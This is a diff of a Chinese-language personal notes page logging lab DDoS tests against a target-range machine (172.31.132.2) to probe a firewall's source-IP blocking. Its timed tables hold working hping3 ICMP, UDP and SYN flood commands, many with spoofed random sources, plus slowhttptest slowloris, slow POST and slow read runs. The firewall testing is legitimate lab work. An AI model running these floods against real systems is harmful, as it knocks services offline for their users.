+</span></span><span style="display:flex;"><span>sudo hping3 --icmp -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">64</span> -i u150 --rand-source 172.31.132.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 【强等级】伪造源IP，极限泛洪。 16：22</span>
+</span></span><span style="display:flex;"><span>sudo timeout 8s hping3 --icmp -d <span style="color:#ff9f43">64</span> --flood --rand-source 172.31.132.2</span></span></code></pre></div><h2 id="二udp-ddos攻击">二、UDP DDos攻击<a class="anchor" href="#%e4%ba%8cudp-ddos%e6%94%bb%e5%87%bb">#</a></h2>
+<p><code>16:23</code>~<code>16:25</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span><span style="color:#78787e"># 【低等级】不伪造源，约发 3000 pps。 16:23</span>
+</span></span><span style="display:flex;"><span>sudo hping3 --udp -p <span style="color:#ff9f43">8080</span> -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">64</span> -i u333 172.31.132.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 【中等级】伪造源，约发50000pps。 16:24</span>
+</span></span><span style="display:flex;"><span>sudo hping3 --udp -p <span style="color:#ff9f43">8080</span> -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">64</span> -i u20 --rand-source 172.31.132.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 【强等级】伪造源，极限泛洪。 16:25</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 如果此条仍未触发报警，说明单台攻击机性能达不到10万pps，需开启多个终端同时运行此命令。</span>
+</span></span><span style="display:flex;"><span>sudo timeout 8s hping3 --udp -p <span style="color:#ff9f43">8080</span> -d <span style="color:#ff9f43">64</span> --flood --rand-source 172.31.132.2</span></span></code></pre></div><h2 id="三tcp-syn-ddos攻击">三、TCP Syn DDos攻击<a class="anchor" href="#%e4%b8%89tcp-syn-ddos%e6%94%bb%e5%87%bb">#</a></h2>
+<p><code>16:26</code>~<code>16:28</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span><span style="color:#78787e"># 【低等级】伪造源。约发 6600 pps。 16:26</span>
+</span></span><span style="display:flex;"><span>sudo hping3 -S -p <span style="color:#ff9f43">8080</span> -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">0</span> -i u150 --rand-source 172.31.132.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 【中等级】伪造源。约发 15000 pps。 16:27</span>
+</span></span><span style="display:flex;"><span>sudo hping3 -S -p <span style="color:#ff9f43">8080</span> -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">0</span> -i u66 --rand-source 172.31.132.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 【强等级】伪造源，极限泛洪。 16:28</span>
+</span></span><span style="display:flex;"><span>sudo timeout 8s hping3 -S -p <span style="color:#ff9f43">8080</span> -d <span style="color:#ff9f43">0</span> --flood --rand-source 172.31.132.2</span></span></code></pre></div><h2 id="四思路调试">四、思路调试<a class="anchor" href="#%e5%9b%9b%e6%80%9d%e8%b7%af%e8%b0%83%e8%af%95">#</a></h2>
+<p>第一组：除了ICMP采用随机源ip，其余全部低于源ip封锁阈值</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>sudo hping3 --udp -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">1400</span> -i u550 -p <span style="color:#ff9f43">8080</span> 172.31.132.2 <span style="color:#78787e"># 1818 packet/s</span>
+</span></span><span style="display:flex;"><span>sudo hping3 -S -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">1400</span> -i u160 --rand-source -p <span style="color:#ff9f43">8080</span> 172.31.132.2 <span style="color:#78787e"># 6250 packet/s</span>
+</span></span><span style="display:flex;"><span>sudo hping3 --icmp -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">1400</span> -i u550 172.31.132.2 <span style="color:#78787e"># 1818 packet/s</span></span></span></code></pre></div><p>第二组：降低包大小为800</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>sudo hping3 --udp -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">800</span> -i u550 -p <span style="color:#ff9f43">8080</span> 172.31.132.2 <span style="color:#78787e"># 1818 packet/s</span>
+</span></span><span style="display:flex;"><span>sudo hping3 -S -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">800</span> -i u160 --rand-source -p <span style="color:#ff9f43">8080</span> 172.31.132.2 <span style="color:#78787e"># 6250 packet/s</span>
+</span></span><span style="display:flex;"><span>sudo hping3 --icmp -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">800</span> -i u550 172.31.132.2 <span style="color:#78787e"># 1818 packet/s</span></span></span></code></pre></div><p>第三组：增加udp和icmp采用rand-source，并减少包大小</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>sudo hping3 --udp -c <span style="color:#ff9f43">10000</span> -d <span style="color:#ff9f43">256</span> -i u200 --rand-source -p <span style="color:#ff9f43">8080</span> 172.31.132.2 <span style="color:#78787e"># 5000 packet/s</span>
+</span></span><span style="display:flex;"><span>sudo hping3 -S -c <span style="color:#ff9f43">10000</span> -d <span style="color:#ff9f43">128</span> -i u80 --rand-source -p <span style="color:#ff9f43">8080</span> 172.31.132.2 <span style="color:#78787e"># 12500 packet/s</span>
+</span></span><span style="display:flex;"><span>sudo hping3 --icmp -c <span style="color:#ff9f43">10000</span> -d <span style="color:#ff9f43">64</span> -i u200 --rand-source 172.31.132.2 <span style="color:#78787e"># 5000 packet/s</span></span></span></code></pre></div><p>第四组：采用自己的ip攻击</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>sudo hping3 --udp -c <span style="color:#ff9f43">10000</span> -d <span style="color:#ff9f43">256</span> -i u200 -p <span style="color:#ff9f43">8080</span> 172.31.132.2
+</span></span><span style="display:flex;"><span>sudo hping3 -S -c <span style="color:#ff9f43">10000</span> -d <span style="color:#ff9f43">128</span> -i u80 -p <span style="color:#ff9f43">8080</span> 172.31.132.2
+</span></span><span style="display:flex;"><span>sudo hping3 --icmp -c <span style="color:#ff9f43">10000</span> -d <span style="color:#ff9f43">64</span> -i u200 172.31.132.2</span></span></code></pre></div><h1 id="410思路">4.10思路<a class="anchor" href="#410%e6%80%9d%e8%b7%af">#</a></h1>
+<p><strong>目标</strong>：</p>
+<ol>
+<li>触发源IP封锁</li>
+<li>绕过源IP封锁，触发目的IP丢包</li>
+</ol>
+<div style="display: flex; justify-content: space-between;">
+<img src="images/1.png" >
+<img src="images/2.png" >
+<img src="images/3.png" >
+</div>
+```ZSH
 # -d参数调整思路：
 # SYN组：-d 0主力, -d 120畸形攻击
 # UDP组：-d 64(攻击cpu), -d 512, -d 1400(攻击带宽)
-# ICMP组：-d 32(伪装Win), -d 56(伪装Linux), -d 1000(大包测试)<h1 id=单ip攻击>单ip攻击<a class=anchor href=#%e5%8d%95ip%e6%94%bb%e5%87%bb>#</a></h1><p>sudo hping3 -S -c 1000000 -d 128 -i u80 -p 8080 172.31.132.2 # 11:22 12500 packet/s
+# ICMP组：-d 32(伪装Win), -d 56(伪装Linux), -d 1000(大包测试)
+<h1 id="单ip攻击">单ip攻击<a class="anchor" href="#%e5%8d%95ip%e6%94%bb%e5%87%bb">#</a></h1>
+<p>sudo hping3 -S -c 1000000 -d 128 -i u80 -p 8080 172.31.132.2 # 11:22 12500 packet/s
 sudo hping3 &ndash;udp -c 1000000 -d 256 -i u100 -p 8080 172.31.132.2 # 11:38 10000 packet/s
-sudo hping3 &ndash;icmp -c 1000000 -d 64 -i u200 172.31.132.2 # 11:44 5000 packet/s</p><h1 id=随机源ip攻击>随机源ip攻击<a class=anchor href=#%e9%9a%8f%e6%9c%ba%e6%ba%90ip%e6%94%bb%e5%87%bb>#</a></h1><p>sudo hping3 -S -c 1000000 -d 128 -i u80 &ndash;rand-source -p 8080 172.31.132.2 # 11:50
+sudo hping3 &ndash;icmp -c 1000000 -d 64 -i u200 172.31.132.2 # 11:44 5000 packet/s</p>
+<h1 id="随机源ip攻击">随机源ip攻击<a class="anchor" href="#%e9%9a%8f%e6%9c%ba%e6%ba%90ip%e6%94%bb%e5%87%bb">#</a></h1>
+<p>sudo hping3 -S -c 1000000 -d 128 -i u80 &ndash;rand-source -p 8080 172.31.132.2 # 11:50
 sudo hping3 &ndash;udp -c 1000000 -d 256 -i u100 &ndash;rand-source -p 8080 172.31.132.2 # 11:56
-sudo hping3 &ndash;icmp -c 1000000 -d 64 -i u200 &ndash;rand-source 172.31.132.2 # 12:02</p><h1 id=udp组攻击一三组-d速度统一u100->UDP组攻击一：三组-d，速度统一，u100 =<a class=anchor href=#udp%e7%bb%84%e6%94%bb%e5%87%bb%e4%b8%80%e4%b8%89%e7%bb%84-d%e9%80%9f%e5%ba%a6%e7%bb%9f%e4%b8%80u100->#</a></h1><p>sudo hping3 &ndash;udp -c 1000000 -d 64 -i u100 &ndash;rand-source -p 8080 172.31.132.2
+sudo hping3 &ndash;icmp -c 1000000 -d 64 -i u200 &ndash;rand-source 172.31.132.2 # 12:02</p>
+<h1 id="udp组攻击一三组-d速度统一u100-">UDP组攻击一：三组-d，速度统一，u100 =<a class="anchor" href="#udp%e7%bb%84%e6%94%bb%e5%87%bb%e4%b8%80%e4%b8%89%e7%bb%84-d%e9%80%9f%e5%ba%a6%e7%bb%9f%e4%b8%80u100-">#</a></h1>
+<p>sudo hping3 &ndash;udp -c 1000000 -d 64 -i u100 &ndash;rand-source -p 8080 172.31.132.2
 sudo hping3 &ndash;udp -c 1000000 -d 512 -i u100 &ndash;rand-source -p 8080 172.31.132.2
-sudo hping3 &ndash;udp -c 1000000 -d 1000 -i u100 &ndash;rand-source -p 8080 172.31.132.2</p><h1 id=udp组攻击二极限速度>UDP组攻击二：极限速度<a class=anchor href=#udp%e7%bb%84%e6%94%bb%e5%87%bb%e4%ba%8c%e6%9e%81%e9%99%90%e9%80%9f%e5%ba%a6>#</a></h1><p>sudo hping3 &ndash;udp &ndash;flood -d 64 &ndash;rand-source -p 8080 172.31.132.2
+sudo hping3 &ndash;udp -c 1000000 -d 1000 -i u100 &ndash;rand-source -p 8080 172.31.132.2</p>
+<h1 id="udp组攻击二极限速度">UDP组攻击二：极限速度<a class="anchor" href="#udp%e7%bb%84%e6%94%bb%e5%87%bb%e4%ba%8c%e6%9e%81%e9%99%90%e9%80%9f%e5%ba%a6">#</a></h1>
+<p>sudo hping3 &ndash;udp &ndash;flood -d 64 &ndash;rand-source -p 8080 172.31.132.2
 sudo hping3 &ndash;udp &ndash;flood -d 512 &ndash;rand-source -p 8080 172.31.132.2
-sudo hping3 &ndash;udp &ndash;flood -d 1000 &ndash;rand-source -p 8080 172.31.132.2</p><h1 id=udp组攻击三单ip攻击>UDP组攻击三：单IP攻击<a class=anchor href=#udp%e7%bb%84%e6%94%bb%e5%87%bb%e4%b8%89%e5%8d%95ip%e6%94%bb%e5%87%bb>#</a></h1><p>sudo hping3 &ndash;udp &ndash;flood -d 64 -p 8080 172.31.132.2
+sudo hping3 &ndash;udp &ndash;flood -d 1000 &ndash;rand-source -p 8080 172.31.132.2</p>
+<h1 id="udp组攻击三单ip攻击">UDP组攻击三：单IP攻击<a class="anchor" href="#udp%e7%bb%84%e6%94%bb%e5%87%bb%e4%b8%89%e5%8d%95ip%e6%94%bb%e5%87%bb">#</a></h1>
+<p>sudo hping3 &ndash;udp &ndash;flood -d 64 -p 8080 172.31.132.2
 sudo hping3 &ndash;udp &ndash;flood -d 512 -p 8080 172.31.132.2 #15:12左右
-sudo hping3 &ndash;udp &ndash;flood -d 1000 &ndash;rand-source -p 8080 172.31.132.2</p><pre tabindex=0><code>
+sudo hping3 &ndash;udp &ndash;flood -d 1000 &ndash;rand-source -p 8080 172.31.132.2</p>
+<pre tabindex="0"><code>
 |攻击模式|对ping影响（正常时延5ms）|对web影响|攻击结果推测|防火墙行为推测|
 |-------|---------|--------|-------|------------|
 |SYN Flood（单IP）|略卡（刚开始平均时延250ms，接着到达一个临界点时延8900ms，往复循环）（停止攻击即恢复连通）|中断|Web中断，Ping周期性高延时。&lt;br /&gt;海量SYN报文引发网络拥塞或设备处理瓶颈，导致正常Ping包被迫排队。由于“停止攻击即恢复连通”，证实网络层未发生绝对的IP级封锁|触发源IP阈值(2000)。&lt;br /&gt;判定为恶意攻击，但未执行300s硬封锁，而是启动了**动态限速/实时丢包过滤**。其检测周期以秒为单位：超标即强行丢包（时延飙升），回落即放行（时延恢复），形成往复循环|
@@ -123,10 +1662,436 @@ sudo hping3 &ndash;udp &ndash;flood -d 1000 &ndash;rand-source -p 8080 172.31.13
 # -d参数调整思路：
 # SYN组：-d 0主力, -d 120畸形攻击
 # UDP组：-d 64(攻击cpu), -d 512, -d 1400(攻击带宽)
-# ICMP组：-d 32(伪装Win), -d 56(伪装Linux), -d 1000(大包测试)</code></pre><table><thead><tr><th>攻击类型</th><th>开始</th><th>结束</th><th>命令</th></tr></thead><tbody><tr><td>防火墙关闭，桥接模式，SYN Flood✅</td><td>10:28</td><td>10:32</td><td>hping3 -S &ndash;flood -d 0 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，SYN Flood✅</td><td>10:34</td><td>10:37</td><td>hping3 -S &ndash;flood -d 64 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，SYN Flood✅</td><td>10:40</td><td>10:43</td><td>hping3 -S &ndash;flood -d 120 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，UDP Flood✅</td><td>10:45</td><td>10:48</td><td>hping3 &ndash;udp &ndash;flood -d 0 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，UDP Flood✅</td><td>10：50</td><td>10：53</td><td>hping3 &ndash;udp &ndash;flood -d 64 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，UDP Flood✅</td><td>10:55</td><td>10:58</td><td>hping3 &ndash;udp &ndash;flood -d 512 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，UDP Flood✅</td><td>11:00</td><td>11:03</td><td>hping3 &ndash;udp &ndash;flood -d 1400 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，ICMP Flood✅</td><td>11:05</td><td>11:08</td><td>hping3 &ndash;icmp &ndash;flood -d 32 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，ICMP Flood✅</td><td>11:10</td><td>11:13</td><td>hping3 &ndash;icmp &ndash;flood -d 56 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，ICMP Flood✅</td><td>11:15</td><td>11:18</td><td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td></tr><tr><td>防火墙开启，NAT模式，单ip ICMP✅</td><td>12:06</td><td>12:08</td><td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td></tr><tr><td>防火墙开启，NAT模式，随机源ICMP❌</td><td>12:10</td><td>12:12</td><td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td></tr><tr><td>防火墙开启，桥接模式，单ip ICMP✅</td><td>12:15</td><td>12:16</td><td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td></tr><tr><td>防火墙开启，桥接模式，随机源ICMP✅</td><td>12:19</td><td>12:20</td><td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td></tr><tr><td>防火墙关闭，NAT模式，单ip ICMP❌</td><td>12:23</td><td>12:24</td><td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td></tr><tr><td>防火墙关闭，NAT模式，随机源ICMP❌</td><td>12:27</td><td>12:28</td><td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，单ip ICMP✅</td><td>12:32</td><td>12:33</td><td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，随机源ICMP✅</td><td>12:35</td><td>12:36</td><td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td></tr></tbody></table><table><thead><tr><th>攻击类型</th><th>开始（1min结束）</th><th>命令</th></tr></thead><tbody><tr><td>防火墙关闭，桥接模式，SYN Flood，6线程</td><td></td><td>sudo hping3 -S &ndash;flood &ndash;rand-source -d 0 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，UDP Flood，6线程</td><td></td><td>sudo hping3 &ndash;udp &ndash;flood &ndash;rand-source -d 0 -p 8080 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，UDP Flood，6线程</td><td></td><td>sudo hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 56 172.31.132.2</td></tr><tr><td>防火墙关闭，桥接模式，ICMP Flood（超大ICMP），6线程</td><td></td><td>sudo hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td></tr></tbody></table><h2 id=二慢dos桥接防火墙关闭失败>二、慢dos（桥接+防火墙关闭）（失败）<a class=anchor href=#%e4%ba%8c%e6%85%a2dos%e6%a1%a5%e6%8e%a5%e9%98%b2%e7%81%ab%e5%a2%99%e5%85%b3%e9%97%ad%e5%a4%b1%e8%b4%a5>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span><span style=color:#78787e># 三种慢dos：slowloris模式（耗尽连接池）、slow post模式（耗尽写缓冲区）、slow read模式（耗尽读缓冲区）</span>
-</span></span><span style=display:flex><span>slowhttptest -c <span style=color:#ff9f43>1000</span> -H -g -o slowloris_stats -i <span style=color:#ff9f43>10</span> -r <span style=color:#ff9f43>200</span> -t GET -u http://172.31.132.2:8080/
-</span></span><span style=display:flex><span>slowhttptest -c <span style=color:#ff9f43>1000</span> -B -g -o slow_post_stats -i <span style=color:#ff9f43>110</span> -r <span style=color:#ff9f43>200</span> -s <span style=color:#ff9f43>8192</span> -t POST -u http://172.31.132.2:8080/
-</span></span><span style=display:flex><span>slowhttptest -c <span style=color:#ff9f43>1000</span> -X -r <span style=color:#ff9f43>200</span> -w <span style=color:#ff9f43>512</span> -y <span style=color:#ff9f43>1024</span> -n <span style=color:#ff9f43>5</span> -z <span style=color:#ff9f43>32</span> -u http://172.31.132.2:8080/</span></span></code></pre></div><ul><li><code>-H</code>开启slowloris模式（发送不完整的Header）</li><li><code>-c 1000</code>建立1000个连接</li><li><code>-i 10</code>发送后续数据的间隔时间（秒）</li><li><code>-r 200</code>每秒建立200个连接</li><li><code>-B</code>开启slow body模式</li><li><code>-s 8192</code>声明content-length为8192字节</li><li><code>-X</code>开启slow read模式</li><li><code>-w 512 -y 1024</code>限制接收窗口大小</li></ul><table><thead><tr><th>攻击类型</th><th>开始（1min结束）</th><th>命令</th></tr></thead><tbody><tr><td>慢dos（连接强度：高频）❌</td><td>16:11</td><td>slowhttptest -c 1000 -H -g -o stats_fast -i 10 -r 500 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>慢dos（连接强度：低频）❌</td><td>16:13</td><td>slowhttptest -c 1000 -H -g -o stats_slow_rate -i 10 -r 10 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>慢dos（发送间隔：长）❌</td><td>16:15</td><td>slowhttptest -c 1000 -H -g -o stats_long_interval -i 30 -r 200 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>慢dos（发送间隔：短）❌</td><td>16:17</td><td>slowhttptest -c 1000 -H -g -o stats_short_interval -i 3 -r 200 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>慢dos（慢速POST攻击）❌</td><td>16:19</td><td>slowhttptest -c 1000 -B -g -o stats_slow_post -i 20 -r 200 -s 8192 -t POST -u http://172.31.132.2:8080/</td></tr></tbody></table><h1 id=414慢速ddos>4.14慢速Ddos<a class=anchor href=#414%e6%85%a2%e9%80%9fddos>#</a></h1><table><thead><tr><th>慢ddos攻击类型</th><th>时间段</th><th>命令</th></tr></thead><tbody><tr><td>低并发❌</td><td>9:26~9:28</td><td>slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>中并发❌</td><td>9:30~9:33</td><td>slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>高并发（测试吞吐极限）✅（但被L4传输层检测为syn攻击）</td><td>9:35~9:39</td><td>slowhttptest -c 5000 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>低连接速率❌</td><td>9:45~9:48</td><td>slowhttptest -c 1000 -H -i 10 -r 10 -u http://172.31.132.2:8080/</td></tr><tr><td>高连接速率❌</td><td>9:51~9:54</td><td>slowhttptest -c 1000 -H -i 10 -r 1000 -u http://172.31.132.2:8080/</td></tr><tr><td>超高连接速率（强制触发防御）❌</td><td>10:00~10:03</td><td>slowhttptest -c 1000 -H -i 10 -r 2000 -u http://172.31.132.2:8080/</td></tr><tr><td>高频发送数据速率❌</td><td>10:05~10：08</td><td>slowhttptest -c 1000 -H -i 5 -r 200 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>极限型发送数据速率❌</td><td>10:10~10:13</td><td>slowhttptest -c 1000 -H -i 60 -r 200 -t GET -u http://172.31.132.2:8080/</td></tr></tbody></table><table><thead><tr><th>慢ddos攻击类型</th><th>时间段</th><th>命令</th></tr></thead><tbody><tr><td>slowloris攻击（稳健）</td><td>13:52~13:56</td><td>slowhttptest -c 2000 -H -i 15 -r 50 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>slowloris攻击（短发送间隔）</td><td>14:02~14:06</td><td>slowhttptest -c 2000 -H -i 5 -r 50 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>slowloris攻击（高压）</td><td>14:08~14:13</td><td>slowhttptest -c 4000 -H -i 30 -r 80 -t GET -u http://172.31.132.2:8080/</td></tr><tr><td>slow post攻击（标准）</td><td>14:14~14:17</td><td>slowhttptest -c 1500 -B -i 10 -r 40 -s 4096 -t POST -u http://172.31.132.2:8080/</td></tr><tr><td>slow post攻击（极慢）</td><td>14:20~14:22</td><td>slowhttptest -c 2500 -B -i 20 -r 60 -x 5 -s 8192 -t POST -u http://172.31.132.2:8080/</td></tr><tr><td>slow read攻击（窗口限制）</td><td>14:23~14:28</td><td>slowhttptest -c 1000 -X -r 30 -w 1 -y 2 -n 5 -u http://172.31.132.2:8080/</td></tr><tr><td>slow read攻击（吞吐抑制）</td><td>14:30~14:35</td><td>slowhttptest -c 2000 -X -r 50 -w 5 -z 10 -n 10 -u http://172.31.132.2:8080/</td></tr></tbody></table></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div></div><div></div></div><div class="flex flex-wrap justify-between"><span><a href=/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/ class="flex align-center"><img src=/icons/backward.svg class=book-icon alt=Backward>
-<span>xnwlaqbc靶机部署与攻击</span>
-</a></span><span><a href=/docs/cybersecurity/DVWA/ class="flex align-center"><span>DVWA</span>
-<img src=/icons/forward.svg class=book-icon alt=Forward></a></span></div><div class=book-comments></div><div class="book-copyright flex justify-center"><small>vnccer - <a href=https://creativecommons.org/licenses/by/4.0/legalcode>© CC BY 4.0</a></small></div><script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#20260403-ddos攻击测试记录>2026.04.03 DDos攻击测试记录</a><ul><li><a href=#一icmp-ddos攻击>一、ICMP DDos攻击</a></li><li><a href=#二udp-ddos攻击>二、UDP DDos攻击</a></li><li><a href=#三tcp-syn-ddos攻击>三、TCP Syn DDos攻击</a></li><li><a href=#四思路调试>四、思路调试</a></li></ul></li><li><a href=#410思路>4.10思路</a></li><li><a href=#单ip攻击>单ip攻击</a></li><li><a href=#随机源ip攻击>随机源ip攻击</a></li><li><a href=#udp组攻击一三组-d速度统一u100->UDP组攻击一：三组-d，速度统一，u100 =</a></li><li><a href=#udp组攻击二极限速度>UDP组攻击二：极限速度</a></li><li><a href=#udp组攻击三单ip攻击>UDP组攻击三：单IP攻击</a><ul><li><a href=#二慢dos桥接防火墙关闭失败>二、慢dos（桥接+防火墙关闭）（失败）</a></li></ul></li><li><a href=#414慢速ddos>4.14慢速Ddos</a></li></ul></nav></div></aside></main></body></html>
+# ICMP组：-d 32(伪装Win), -d 56(伪装Linux), -d 1000(大包测试)</code></pre><table>
+  <thead>
+      <tr>
+          <th>攻击类型</th>
+          <th>开始</th>
+          <th>结束</th>
+          <th>命令</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>防火墙关闭，桥接模式，SYN Flood✅</td>
+          <td>10:28</td>
+          <td>10:32</td>
+          <td>hping3 -S &ndash;flood -d 0 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，SYN Flood✅</td>
+          <td>10:34</td>
+          <td>10:37</td>
+          <td>hping3 -S &ndash;flood -d 64 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，SYN Flood✅</td>
+          <td>10:40</td>
+          <td>10:43</td>
+          <td>hping3 -S &ndash;flood -d 120 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，UDP Flood✅</td>
+          <td>10:45</td>
+          <td>10:48</td>
+          <td>hping3 &ndash;udp &ndash;flood -d 0 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，UDP Flood✅</td>
+          <td>10：50</td>
+          <td>10：53</td>
+          <td>hping3 &ndash;udp &ndash;flood -d 64 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，UDP Flood✅</td>
+          <td>10:55</td>
+          <td>10:58</td>
+          <td>hping3 &ndash;udp &ndash;flood -d 512 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，UDP Flood✅</td>
+          <td>11:00</td>
+          <td>11:03</td>
+          <td>hping3 &ndash;udp &ndash;flood -d 1400 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，ICMP Flood✅</td>
+          <td>11:05</td>
+          <td>11:08</td>
+          <td>hping3 &ndash;icmp &ndash;flood -d 32 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，ICMP Flood✅</td>
+          <td>11:10</td>
+          <td>11:13</td>
+          <td>hping3 &ndash;icmp &ndash;flood -d 56 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，ICMP Flood✅</td>
+          <td>11:15</td>
+          <td>11:18</td>
+          <td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙开启，NAT模式，单ip ICMP✅</td>
+          <td>12:06</td>
+          <td>12:08</td>
+          <td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙开启，NAT模式，随机源ICMP❌</td>
+          <td>12:10</td>
+          <td>12:12</td>
+          <td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙开启，桥接模式，单ip ICMP✅</td>
+          <td>12:15</td>
+          <td>12:16</td>
+          <td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙开启，桥接模式，随机源ICMP✅</td>
+          <td>12:19</td>
+          <td>12:20</td>
+          <td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，NAT模式，单ip ICMP❌</td>
+          <td>12:23</td>
+          <td>12:24</td>
